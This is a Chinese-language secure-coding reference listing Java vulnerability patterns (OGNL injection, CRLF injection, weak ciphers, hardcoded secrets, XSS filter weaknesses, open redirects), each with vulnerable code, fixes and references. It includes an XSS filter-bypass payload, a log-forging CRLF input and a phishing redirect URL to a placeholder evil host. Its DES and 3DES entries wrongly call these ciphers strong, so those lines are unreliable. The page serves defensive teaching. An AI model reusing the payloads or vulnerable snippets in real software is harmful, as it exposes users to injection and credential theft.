id="使用OGNL表达式时潜在的代码注入"><a href="#使用OGNL表达式时潜在的代码注入" class="headerlink" title="使用OGNL表达式时潜在的代码注入"></a>使用OGNL表达式时潜在的代码注入</h1><p>漏洞规则： OGNL_INJECTION<br>表达式语言被用来构建动态的值。源数据应该被严格的检验，以避免未过滤的时候进入到表达式的执行器中<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public void getUserProperty(String property) &#123;</span><br><span class="line">  [...]</span><br><span class="line">  //The first argument is the dynamic expression.</span><br><span class="line">  return ognlUtil.getValue(&quot;user.&quot;+property, ctx, root, String.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案<br>一般，解析OGNL表达式的函数不应该接收用户的输入。它旨在被用于静态配置和jsp。</p><p>引用：<br><a href="https://community.saas.hpe.com/t5/Security-Research/Struts-2-OGNL-Expression-Injections/ba-p/288881" target="_blank" rel="noopener">HP Enterprise: Struts 2 OGNL Expression Injections by Alvaro MuÃ±oz</a><br><a href="https://blog.gdssecurity.com/labs/2017/3/27/an-analysis-of-cve-2017-5638.html" target="_blank" rel="noopener">Gotham Digital Science: An Analysis Of CVE-2017-5638</a><br><a href="http://struts.apache.org/docs/s2-016.html" target="_blank" rel="noopener">Apache Struts2: Vulnerability S2-016</a><br><a href="https://struts.apache.org/docs/ognl.html" target="_blank" rel="noopener">Apache Struts 2 Documentation: OGNL</a></p><h1 id="潜在的http返回报文被分割"><a href="#潜在的http返回报文被分割" class="headerlink" title="潜在的http返回报文被分割"></a>潜在的http返回报文被分割</h1><p>漏洞特征：HTTP_RESPONSE_SPLITTING<br>当http请求包含未期望的CR 和 LF字符的时候，服务器可能会把返回的报文流解析成两个HTTP返回报文（而不是一个）。攻击者可以控制第二个报文并且发动诸如xss攻击或者缓存投毒攻击。按照OWASP的建议，实际上，这个问题现代java EE应用服务器所修复，但还是要严格检验输入。如果你关注这个漏洞，你应该测试你算关心的那个平台，看看这个平台是否允许CR或者 LF被注入到返回报文的头部中。这个漏洞常常被报告为低危，如果你使用有漏洞的平台，请仔细检查低危告警。<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String author = request.getParameter(AUTHOR_PARAMETER);</span><br><span class="line">// ...</span><br><span class="line">Cookie cookie = new Cookie(&quot;author&quot;, author);</span><br><span class="line">response.addCookie(cookie);</span><br></pre></td></tr></table></figure><p>引用:<br><a href="https://www.owasp.org/index.php/HTTP_Response_Splitting" target="_blank" rel="noopener">OWASP: HTTP Response Splitting</a><br><a href="http://cwe.mitre.org/data/definitions/113.html" target="_blank" rel="noopener">CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers (‘HTTP Response Splitting’)</a><br><a href="http://cwe.mitre.org/data/definitions/93.html" target="_blank" rel="noopener">CWE-93: Improper Neutralization of CRLF Sequences (‘CRLF Injection’)</a></p><h1 id="在日志中潜在的CRLF注入"><a href="#在日志中潜在的CRLF注入" class="headerlink" title="在日志中潜在的CRLF注入"></a>在日志中潜在的CRLF注入</h1><p>漏洞规则：CRLF_INJECTION_LOGS<br>当未被信任的输入数据进入到日志中，并且没有正确的做过滤。那么攻击者就可以伪造日志数据或者包含恶意内容。插入恶意的实体通常被用于歪曲统计，分散管理员注意力，或者甚至暗示另一方有恶意行为。如果日志文件被一些自动化的程序自动处理，那么攻击者可以通过破坏文件格式使文件无法使用或者注入一些不被期望的特殊字符。攻击者也可能注入代码或者其他的命令到日志文件中，可能会利用日志处理程序中的漏洞（例如：命令注入或者xss）<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String val = request.getParameter(&quot;user&quot;);</span><br><span class="line">String metadata = request.getParameter(&quot;metadata&quot;);</span><br><span class="line">[...]</span><br><span class="line">if(authenticated) &#123;</span><br><span class="line">    log.info(&quot;User &quot; + val + &quot; (&quot; + metadata + &quot;) was authenticated successfully&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    log.info(&quot;User &quot; + val + &quot; (&quot; + metadata + &quot;) was not authenticated&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意用户可能会发送这样的metadata数据：“Firefox) was authenticated successfully\r\n[INFO] User bbb (Internet Explorer”.</p><p>解决方案：<br>你要手工过滤每一个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log.info(&quot;User &quot; + val.replaceAll(&quot;[\r\n]&quot;,&quot;&quot;) + &quot; (&quot; + userAgent.replaceAll(&quot;[\r\n]&quot;,&quot;&quot;) + &quot;) was not authenticated&quot;);</span><br></pre></td></tr></table></figure><p>你要配置日志服务器，目的是替换掉所有消息中的\r\n。 OWASP Security Logging已经在Logback 和 Log4j.实现了这个功能。<br>引用：<br><a href="http://cwe.mitre.org/data/definitions/117.html" target="_blank" rel="noopener">CWE-117: Improper Output Neutralization for Logs</a><br><a href="http://cwe.mitre.org/data/definitions/93.html" target="_blank" rel="noopener">CWE-93: Improper Neutralization of CRLF Sequences (‘CRLF Injection’)</a><br><a href="https://logback.qos.ch/manual/layouts.html#replace" target="_blank" rel="noopener">CWE-93: Improper Neutralization of CRLF Sequences (‘CRLF Injection’)</a><br><a href="https://github.com/javabeanz/owasp-security-logging" target="_blank" rel="noopener">OWASP Security Logging</a></p><h1 id="潜在的外部控制配置"><a href="#潜在的外部控制配置" class="headerlink" title="潜在的外部控制配置"></a>潜在的外部控制配置</h1><p>漏洞特征：EXTERNAL_CONFIG_CONTROL<br>允许外部控制系统设置会导致系统的中断或者导致应用行为异常，和潜在的恶意行为。攻击者通过提供不存在的catalog名称可能会导致错误，或者链接到未授权的数据库服务器。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn.setCatalog(request.getParameter(&quot;catalog&quot;));</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/15.html" target="_blank" rel="noopener">CWE-15: External Control of System or Configuration Setting</a></p><h1 id="坏的十六进制数据"><a href="#坏的十六进制数据" class="headerlink" title="坏的十六进制数据"></a>坏的十六进制数据</h1><p>漏洞特征： BAD_HEXA_CONVERSION<br>当把十六进制字节数组转换为人类可读的字符串的时候，如果数组是被一个字节一个字节读取的话，可能会导致转换错误。下面这个例子是一个很明显的使用 Integer.toHexString() 做转换的例子，它可能会被字节码中的零字节所截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MessageDigest md = MessageDigest.getInstance(&quot;SHA-256&quot;);</span><br><span class="line">byte[] resultBytes = md.digest(password.getBytes(&quot;UTF-8&quot;));</span><br><span class="line"></span><br><span class="line">StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">for(byte b :resultBytes) &#123;</span><br><span class="line">    stringBuilder.append( Integer.toHexString( b &amp; 0xFF ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return stringBuilder.toString();</span><br></pre></td></tr></table></figure><p>这个错误削弱了hash的计算值，因为它引入了更多的碰撞。比如，用上面的函数计算”0x0679” 和 “0x6709”都会输出679</p><p>在下面的解决方案中，使用String.format()替换toHexString()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stringBuilder.append( String.format( &quot;%02X&quot;, b ) );</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/704.html" target="_blank" rel="noopener">CWE-704: Incorrect Type Conversion or Cast</a></p><h1 id="Hazelcast对称加密"><a href="#Hazelcast对称加密" class="headerlink" title="Hazelcast对称加密"></a>Hazelcast对称加密</h1><p>漏洞规则： HAZELCAST_SYMMETRIC_ENCRYPTION<br>配置Hazelcast让网络通信使用对称加密（可能是DES或者其他的）<br>密码本身不能提供完整性和身份验证。使用非对称加密会更好一些</p><p>引用：<br>[WASC-04: Insufficient Transport Layer Protection](<a href="http://projects.webappsec.org/w/page/13246945/Insufficient" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246945/Insufficient</a> Transport Layer Protection)<br><a href="http://docs.hazelcast.org/docs/3.5/manual/html/encryption.html" target="_blank" rel="noopener">Hazelcast Documentation: Encryption</a><br><a href="http://cwe.mitre.org/data/definitions/326.html" target="_blank" rel="noopener">CWE-326: Inadequate Encryption Strength</a></p><h1 id="不安全的空密码"><a href="#不安全的空密码" class="headerlink" title="不安全的空密码"></a>不安全的空密码</h1><p>漏洞特征： NULL_CIPHER<br>空密码很少被使用在生产环境中。它通过返回与明文相同的密文来实现Cipher接口。在极少的环境中，比如测试环境，才可能会出现空密码<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cipher doNothingCihper = new NullCipher();</span><br><span class="line">[...]</span><br><span class="line">//The ciphertext produced will be identical to the plaintext.</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>解决方案<br>避免使用空密码，意外的使用会导致严重的安全风险。<br>引用：<br><a href="http://cwe.mitre.org/data/definitions/327.html" target="_blank" rel="noopener">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a></p><p>未加密的socket<br>漏洞特征：UNENCRYPTED_SOCKET<br>如果网络通信不加密的话，那么传输的数据就会被攻击者拦截并读取里面的内容。<br>有漏洞的代码：<br>明文socket（透明传输）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Socket soc = new Socket(&quot;www.google.com&quot;,80);</span><br></pre></td></tr></table></figure><p>解决方案：<br>ssl socket（加密传输）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Socket soc = SSLSocketFactory.getDefault().createSocket(&quot;www.google.com&quot;, 443);</span><br></pre></td></tr></table></figure><p>使用sslsocket，你需要确保你使用的SSLSocketFactory能验证所提供的证书是否有效，这样你就不会遭受中间人攻击。请阅读owasp中关于传输层协议的那一章，以了解更多正确的做法。</p><p>引用：<br><a href="https://www.owasp.org/index.php/Top_10_2010-A9" target="_blank" rel="noopener">OWASP: Top 10 2010-A9-Insufficient Transport Layer Protection</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure" target="_blank" rel="noopener">OWASP: Top 10 2013-A6-Sensitive Data Exposure</a><br><a href="https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Transport Layer Protection Cheat Sheet</a><br>[WASC-04: Insufficient Transport Layer Protection](<a href="http://projects.webappsec.org/w/page/13246945/Insufficient" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246945/Insufficient</a> Transport Layer Protection)<br><a href="http://cwe.mitre.org/data/definitions/319.html" target="_blank" rel="noopener">CWE-319: Cleartext Transmission of Sensitive Information</a></p><h1 id="未加密的服务器socket"><a href="#未加密的服务器socket" class="headerlink" title="未加密的服务器socket"></a>未加密的服务器socket</h1><p>漏洞特征：UNENCRYPTED_SERVER_SOCKET</p><p>如果网络通信不加密的话，那么传输的数据就会被攻击者拦截并读取里面的内容。<br>有漏洞的代码：<br>明文socket（透明传输）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket soc = new ServerSocket(1234);</span><br></pre></td></tr></table></figure><p>解决方案：<br>ssl socket（加密传输）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket soc = SSLServerSocketFactory.getDefault().createServerSocket(1234);</span><br></pre></td></tr></table></figure><p>使用sslsocket，你需要确保你使用的SSLSocketFactory能验证所提供的证书是否有效，这样你就不会遭受中间人攻击。请阅读owasp中关于传输层协议的那一章，以了解更多正确的做法。</p><p>引用：<br><a href="https://www.owasp.org/index.php/Top_10_2010-A9" target="_blank" rel="noopener">OWASP: Top 10 2010-A9-Insufficient Transport Layer Protection</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure" target="_blank" rel="noopener">OWASP: Top 10 2013-A6-Sensitive Data Exposure</a><br><a href="https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Transport Layer Protection Cheat Sheet</a><br>[WASC-04: Insufficient Transport Layer Protection](<a href="http://projects.webappsec.org/w/page/13246945/Insufficient" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246945/Insufficient</a> Transport Layer Protection)<br><a href="http://cwe.mitre.org/data/definitions/319.html" target="_blank" rel="noopener">CWE-319: Cleartext Transmission of Sensitive Information</a></p><h1 id="DES是不安全的"><a href="#DES是不安全的" class="headerlink" title="DES是不安全的"></a>DES是不安全的</h1><p>漏洞特征：DES_USAGE</p><p>DES被认为是现代加密系统中比较强壮的加密方式，当前，NIST建议使用AES block ciphers来替代DES<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;DES/ECB/PKCS5Padding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>解决方案示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://www.nist.gov/itl/fips/060205_des.cfm" target="_blank" rel="noopener">NIST Withdraws Outdated Data Encryption Standard</a><br><a href="http://cwe.mitre.org/data/definitions/326.html" target="_blank" rel="noopener">CWE-326: Inadequate Encryption Strength</a></p><h1 id="DESede是不安全的"><a href="#DESede是不安全的" class="headerlink" title="DESede是不安全的"></a>DESede是不安全的</h1><p>漏洞特征:TDES_USAGE</p><p>三次DES（也被称为3DES 或者 DESede）被认为是现代加密系统中比较强壮的加密方式，当前，NIST建议使用AES block ciphers来替代DES<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;DESede/ECB/PKCS5Padding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>解决方案示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://www.nist.gov/itl/fips/060205_des.cfm" target="_blank" rel="noopener">NIST Withdraws Outdated Data Encryption Standard</a><br><a href="http://cwe.mitre.org/data/definitions/326.html" target="_blank" rel="noopener">CWE-326: Inadequate Encryption Strength</a></p><h1 id="不用padding的RSA是不安全的"><a href="#不用padding的RSA是不安全的" class="headerlink" title="不用padding的RSA是不安全的"></a>不用padding的RSA是不安全的</h1><p>漏洞特征：RSA_NO_PADDING</p><p>软件使用RSA加密算法但是没有使用非对称加密填充(OAEP), 这种加密可能会是比较脆弱的<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cipher.getInstance(&quot;RSA/NONE/NoPadding&quot;)</span><br></pre></td></tr></table></figure><p>解决方案：<br>应该用下面的代码来替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cipher.getInstance(&quot;RSA/ECB/OAEPWithMD5AndMGF1Padding&quot;)</span><br></pre></td></tr></table></figure><p>引用:<br><a href="http://cwe.mitre.org/data/definitions/780.html" target="_blank" rel="noopener">CWE-780: Use of RSA Algorithm without OAEP</a><br><a href="http://rdist.root.org/2009/10/06/why-rsa-encryption-padding-is-critical/" target="_blank" rel="noopener">Root Labs: Why RSA encryption padding is critical</a></p><h1 id="硬编码密码"><a href="#硬编码密码" class="headerlink" title="硬编码密码"></a>硬编码密码</h1><p>漏洞特征：HARD_CODE_PASSWORD<br>密码不应该留在源码里面，在企业里面源码会被广泛的分享，有些部分甚至会被开源出来，为了更安全的管理，密码和密钥应该被单独的存储在配置文件中，或者keystores中（硬编码密钥会有一个单独的特征：Hard Coded Key pattern)<br>有漏洞的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private String SECRET_PASSWORD = &quot;letMeIn!&quot;;</span><br><span class="line"></span><br><span class="line">Properties props = new Properties();</span><br><span class="line">props.put(Context.SECURITY_CREDENTIALS, &quot;p@ssw0rd&quot;);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/259.html" target="_blank" rel="noopener">CWE-259: Use of Hard-coded Password</a></p><h1 id="硬编码密钥"><a href="#硬编码密钥" class="headerlink" title="硬编码密钥"></a>硬编码密钥</h1><p>漏洞特征： HARD_CODE_KEY<br>加密密钥不应该留在源码里面，在企业里面源码会被广泛的分享，有些部分甚至会被开源出来，为了更安全的管理，密码和密钥应该被单独的存储在配置文件中，或者keystores中（硬编码密码会有一个单独的特征：Hard Coded Password pattern)<br>有漏洞的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">byte[] key = &#123;1, 2, 3, 4, 5, 6, 7, 8&#125;;</span><br><span class="line">SecretKeySpec spec = new SecretKeySpec(key, &quot;AES&quot;);</span><br><span class="line">Cipher aes = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">aes.init(Cipher.ENCRYPT_MODE, spec);</span><br><span class="line">return aesCipher.doFinal(secretData);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/321.html" target="_blank" rel="noopener">CWE-321: Use of Hard-coded Cryptographic Key</a></p><h1 id="不安全的hash比较"><a href="#不安全的hash比较" class="headerlink" title="不安全的hash比较"></a>不安全的hash比较</h1><p>漏洞特征：UNSAFE_HASH_EQUALS<br>攻击者可能会通过密钥的比较时间来发现密钥的hash值，当Arrays.equals() 或者 String.equals()被调用的时候，如果有一些字节被匹配到的话，它们会推出的更早一些<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String actualHash = ...</span><br><span class="line"></span><br><span class="line">if(userInput.equals(actualHash)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String actualHash = ...</span><br><span class="line"></span><br><span class="line">if(MessageDigest.isEqual(userInput.getBytes(),actualHash.getBytes())) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://cwe.mitre.org/data/definitions/203.html" target="_blank" rel="noopener">CWE-203: Information Exposure Through DiscrepancyKey</a></p><h1 id="来自Struts-Form的输入没有被验证"><a href="#来自Struts-Form的输入没有被验证" class="headerlink" title="来自Struts Form的输入没有被验证"></a>来自Struts Form的输入没有被验证</h1><p>漏洞特征： STRUTS_FORM_VALIDATION<br>来自Form的输入应该被简单的验证一下，预防性的验证能够抵御更进一步的攻击。<br>validate这个函数引入了验证的实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class RegistrationForm extends ValidatorForm &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private String email;</span><br><span class="line"></span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">    public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) &#123;</span><br><span class="line">        //Validation code for name and email parameters passed in via the HttpRequest goes here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a><br><a href="http://cwe.mitre.org/data/definitions/106.html" target="_blank" rel="noopener">CWE-106: Struts: Plug-in Framework not in Use</a></p><h1 id="XSSRequestWrapper的xss防护是脆弱的"><a href="#XSSRequestWrapper的xss防护是脆弱的" class="headerlink" title="XSSRequestWrapper的xss防护是脆弱的"></a>XSSRequestWrapper的xss防护是脆弱的</h1><p>漏洞特征：XSS_REQUEST_WRAPPER<br>在各种公开的博客里面，博主通过实现HttpServletRequestWrapper调用XSSRequestWrapper<br>这个过滤函数的脆弱点在于以下的几个方面：</p><ul><li>它仅仅覆盖参数，而没有覆盖到http头或者侧信道输入 。</li><li>简单替换的方式很容易会被绕过（见下面的例子）</li><li>黑名单的方式太脆弱（不如用白名单的方式来验证好的输入）</li></ul><p>绕过示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scrivbscript:pt&gt;alert(1)&lt;/scrivbscript:pt&gt;</span><br></pre></td></tr></table></figure><p>上面的输入会被转换为：<code>alert(1)</code>。移除了vbscript:”之后就变成了<code>&quot;.*&quot;</code></p><p>为了更强的保护，请在view (template, jsp, …) 中选择自动编码字符串的解决方案，解决方案里面的规则被定义在OWASP XSS Prevention 备忘录中。<br>引用：<br>[WASC-8: Cross Site Scripting](<a href="http://projects.webappsec.org/w/page/13246920/Cross" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246920/Cross</a> Site Scripting)<br><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: XSS Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank" rel="noopener">OWASP: Top 10 2013-A3: Cross-Site Scripting (XSS)</a><br><a href="http://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a></p><h1 id="Blowfish-使用过短的密钥"><a href="#Blowfish-使用过短的密钥" class="headerlink" title="Blowfish 使用过短的密钥"></a>Blowfish 使用过短的密钥</h1><p>漏洞特征：BLOWFISH_KEY_SIZE<br>Blowfish的密钥支持32 bits 到 448 bits的长度。如果密钥太短，会导致加密内容被黑客暴力破解。如果使用Blowfish的话，密钥至少应该选择128 bits 。<br>如果算法被改变，那么应该AES分组密码</p><p>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KeyGenerator keyGen = KeyGenerator.getInstance(&quot;Blowfish&quot;);</span><br><span class="line">keyGen.init(64);</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KeyGenerator keyGen = KeyGenerator.getInstance(&quot;Blowfish&quot;);</span><br><span class="line">keyGen.init(128);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://en.wikipedia.org/wiki/Blowfish_(cipher)" target="_blank" rel="noopener">Blowfish (cipher)</a><br><a href="http://cwe.mitre.org/data/definitions/326.html" target="_blank" rel="noopener">CWE-326: Inadequate Encryption Strength</a></p><h1 id="RSA使用了过短密钥"><a href="#RSA使用了过短密钥" class="headerlink" title="RSA使用了过短密钥"></a>RSA使用了过短密钥</h1><p>漏洞特征: RSA_KEY_SIZE<br>NIST建议RSA算法应该使用2048bits的密钥或者更长的密钥<br>“电子签名验证 | RSA: 1024 ≤ len(n) &lt; 2048 | 传统使用”<br>“电子签名验证 | RSA: len(n) ≥ 2048 | 可接受”</p><ul><li>NIST: <a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" target="_blank" rel="noopener">数据传输建议使用的加密方式和密钥长度 p.7</a></li></ul><p>漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KeyPairGenerator keyGen = KeyPairGenerator.getInstance(&quot;RSA&quot;);</span><br><span class="line">keyGen.initialize(512);</span><br></pre></td></tr></table></figure><p>解决方案：<br>密钥的生成至少应该像下面这样使用2048位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KeyPairGenerator keyGen = KeyPairGenerator.getInstance(&quot;RSA&quot;);</span><br><span class="line">keyGen.initialize(2048);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://csrc.nist.gov/groups/ST/toolkit/key_management.html" target="_blank" rel="noopener">NIST: Latest publication on key management</a><br><a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" target="_blank" rel="noopener">NIST: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths p.7</a><br><a href="http://www.emc.com/emc-plus/rsa-labs/standards-initiatives/how-large-a-key-should-be-used.htm" target="_blank" rel="noopener">RSA Laboratories: 3.1.5 How large a key should be used in the RSA cryptosystem?</a><br><a href="http://en.wikipedia.org/wiki/Key_size#Asymmetric_algorithm_key_lengths" target="_blank" rel="noopener">Wikipedia: Asymmetric algorithm key lengths</a><br><a href="http://cwe.mitre.org/data/definitions/326.html" target="_blank" rel="noopener">CWE-326: Inadequate Encryption Strength</a><br><a href="http://www.keylength.com/en/compare/" target="_blank" rel="noopener">Keylength.com (BlueKrypt): Aggregate key length recommendations.</a></p><h1 id="未验证的重定向"><a href="#未验证的重定向" class="headerlink" title="未验证的重定向"></a>未验证的重定向</h1><p>漏洞特征：UNVALIDATED_REDIRECT<br>未验证重定向漏洞是因为应用跳转到用户输入的指定目标url，这个输入的参数没有被充分的验证。这个漏洞可能会被用来钓鱼</p><p>假设的场景：</p><ol><li>用户被欺骗点了恶意链接：<a href="http://website.com/login?redirect=http://evil.vvebsite.com/fake/login" target="_blank" rel="noopener">http://website.com/login?redirect=http://evil.vvebsite.com/fake/login</a></li><li>用户被重定向到了一个虚假的登录页面，这样页面看起来就像真的一样(<a href="http://evil.vvebsite.com/fake/login" target="_blank" rel="noopener">http://evil.vvebsite.com/fake/login</a>)</li><li>用户输入了他的凭据</li><li>恶意网站偷走了用户的凭据，并且跳转回了原来的网站</li></ol><p>这个攻击貌似是合理的，因为大多数用户在被重定向之后不会再次检查url。而且跳转到授权页面也是很普遍的现象。<br>漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">    [...]</span><br><span class="line">    resp.sendRedirect(req.getParameter(&quot;redirectUrl&quot;));</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案/对策</p><ul><li>不要从用户的输入中接受重定向的目的url</li><li>接受一个目的地址的key，这个key可以查询到一个合法的目的地址。</li><li>仅接受相对路径</li><li>urls白名单（如果可行的话）</li><li>验证url开始的部分是否在白名单里面</li></ul><p>引用：<br>[WASC-38: URL Redirector Abuse](<a href="http://projects.webappsec.org/w/page/13246981/URL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246981/URL</a> Redirector Abuse)<br><a href="https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards" target="_blank" 